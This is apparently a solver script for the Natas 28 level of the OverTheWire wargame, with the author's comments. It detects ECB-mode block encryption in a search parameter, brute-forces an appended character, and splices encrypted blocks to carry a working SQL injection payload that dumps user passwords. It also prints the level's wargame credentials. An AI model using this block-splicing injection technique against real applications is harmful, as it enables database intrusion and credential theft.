#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup
import base64

username = "natas28"
password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

# after posting some different data like:
# a --> G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
# s --> G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPI%2BjVOKpzBAHVGo0XIzCijxvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
# w --> G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKlwoXvDTqKtYfcUSRUbdOSvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D

# it's clear that there's may be a constant part of the string which is in our case:
# from start --> G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK
# from end --> vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
# this is like a block by block encryption teqinuque
# so let's send some different data length to investigate more about this

# after 1st investigation, we'll assume that our block size is about 16 chars
block_size = 16

# after 2nd investigation we can see that block 1 and block 2
# has the same repr() for every query, which means it's a constant string
# anther thing is that from query_length 10 and on, block 3 seems to be the same
# which means we can brute force that one char between query_length 9 and query_length 10
# to know what character they're appending to the real data and we can probably leak it out

# was 1st
# for i in range(100):
# was 2nd
# as 16 was the first time we hit a change in length from  1st
""" for i in range(16):
    post_data = {"query": "a" * i}
    response = session.post(url, data=post_data, auth=(username, password))

    url_encoded = response.url[60:] # strip out the static portion of the url
    url_unquoted = requests.utils.unquote(url_encoded)
    url_base64_decodedd = base64.b64decode(url_unquoted)
    # this isn't purley base64 encoded, so we need to check out the raw bytes
    url_repr = repr(url_base64_decodedd)

    # was 1st
    print("=" * 50) # for visual thing :)
    print(f"query_length: {i} and url_repr_length: {len(url_base64_decodedd)}")

    # was 2nd
    print("=" * 50) # for visual thing :)
    for block in range(80//block_size):
        block_16 = url_base64_decodedd[block*block_size : (block+1)*block_size] # that will go 16 bytes at a time
        block_16_repr = repr(block_16)
        print(f"block is {block+1} and data is {block_16_repr}") """

# query_length of 9 leads to block 3 of: \x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb
# query_length of 10 leads to block 3 of: \xc0\x87-\xee\x8b\xc9\x0b\x11V\x91;\x08\xa2#\xa3\x9e
# was 3rd
""" correct_string = str(b'\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb')
for c in string.printable:
    print(f"trying char: {c}")
    post_data = {"query": "a"*9 + c}
    response = session.post(url, data=post_data, auth=(username, password))
    url_encoded = response.url[60:]
    url_unquoted = requests.utils.unquote(url_encoded)
    url_base64_decodedd = base64.b64decode(url_unquoted)

    block = 2 # as it's zero-based..
    block_16 = url_base64_decodedd[block*block_size : (block+1)*block_size]
    answer = repr(block_16)
    if answer == correct_string:
        print (f"we have found that character: {c}")
        break """

# and from the 3rd investigation our 10th char is a '%' which means we may have
# '%' --> b'\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb'
# a sql command like that:
# SELECT text FROM jokes where text like '%input%'
# and if that is the case, that means we are writting our input inside
# a string '' but we can't easily escape as there's probably a filter to our input
# from the first tries, so we can do the following

# was 4th
# first determine how many blocks we need to fill
injection = "a" * 9 + "' UNION SELECT password from users; #"
blocks = (len(injection) - 10) // block_size  # the (a*9 + ')
if (len(injection) - 10) % block_size != 0:
    blocks += 1
# print(blocks)

post_data = {"query": injection}
response = session.post(url, data=post_data, auth=(username, password))

url_encoded = response.url[60:]
url_unquoted = requests.utils.unquote(url_encoded)

raw_inject = base64.b64decode(url_unquoted)


# was 5th
# now let's fake the query we send like that:
# start_good_base + our_injection + end_good_base
# the following is a request to get and store that good_base
post_data = {"query": "a" * 10}
response = session.post(url, data=post_data, auth=(username, password))

url_encoded = response.url[60:]
url_unquoted = requests.utils.unquote(url_encoded)

good_base = base64.b64decode(url_unquoted)

# the following is our fake request
query = (
    good_base[: block_size * 3]
    + raw_inject[block_size * 3:block_size * 3 + blocks * block_size]
    + good_base[block_size * 3:]
)
query_base64_encoded = base64.b64encode(query)
query_url_quoted = requests.utils.quote(query_base64_encoded)
# the previous qoute function doesn't qoute '/' so we need to replace them ourselves:
query_url_quoted = query_url_quoted.replace("/", "%2F")
# print(query_url_quoted)

# then we'll make the request as get:
new_url = url + "/search.php/?query=" + query_url_quoted
response = session.post(new_url, auth=(username, password))
content = response.content

soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)

print()  # just for having some space

# this time we got an /index-source.html
# the documentation is above :)
#
# we got it right:
# Username: natas29
# Password: airooCaiseiyee8he8xongien9euhe8b
